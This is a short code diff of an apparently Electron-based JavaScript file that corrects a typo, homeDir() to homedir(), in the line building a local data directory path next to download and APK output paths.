@@ -8,7 +8,7 @@ var socket = remote.getCurrentWebContents().victim;
 var homedir = require('node-homedir');
 var path = require("path");
 
-var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
+var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
 
